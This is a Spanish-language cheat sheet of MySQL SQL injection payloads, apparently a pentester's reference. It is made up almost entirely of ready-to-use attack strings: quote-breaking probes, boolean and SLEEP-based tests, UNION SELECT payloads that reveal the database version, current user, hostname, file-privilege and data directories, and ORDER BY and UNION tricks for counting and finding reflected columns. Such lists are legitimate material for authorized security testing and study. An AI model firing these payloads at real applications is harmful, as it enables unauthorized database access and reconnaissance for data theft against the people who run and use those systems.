# 🦕 ꧁𓊈MYSQL𓊉꧂

**`⃤⃞⃟⃤`** Sondas.

```bash
# Testing rapido. El 1 representa el numero o letra despues del parametro.
1'
1"
1\
1)
1')
1%00
1%09%23
--------------------------------------------------------------------------
1' AND 1=1#
1' AND 1=2#
1' AND SLEEP(3)#
1' UNION SELECT 1#
1' ORDER BY 1#
```
**`⃤⃞⃟⃤`** Version.
```bash
# Payloads para detectar la version.
1' UNION SELECT @@version,USER(),DATABASE()# <<< para 3 columnas
1' AND @@version LIKE '%MariaDB'#
1' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine# <<< para 3 columnas
```
**`⃤⃞⃟⃤`** Usuario y privilegios.
```bash
# Payloads para ver privilegios. 3 columnas.
1' UNION SELECT USER(),CURRENT_USER(),@@hostname#
1' UNION SELECT @@secure_file_priv,@@plugin_dir,@@datadir#
1' UNION SELECT @@character_set_connection,@@sql_mode,@@have_symlink#
```
**`⃤⃞⃟⃤`** Info sin UNION.
```bash
1' AND DATABASE() LIKE '%'#
1' AND USER() LIKE '%@%'#
```
**`⃤⃞⃟⃤`** Deteccion de columnas con ORDER y UNION.
```bash
# Cambiar el numero hasta la deteccion o NULL.
1' ORDER BY 5# 
1' ORDER BY 5 --%20
1' UNION SELECT NULL#
1' UNION SELECT NULL --%20
```
**`⃤⃞⃟⃤`** Deteccion de columna reflejada.
```bash
# Ejemplo para 3 columnas
-1' UNION SELECT 'test1','test2','test3'#
-1' UNION SELECT 'test1','test2','test3'--%20
```


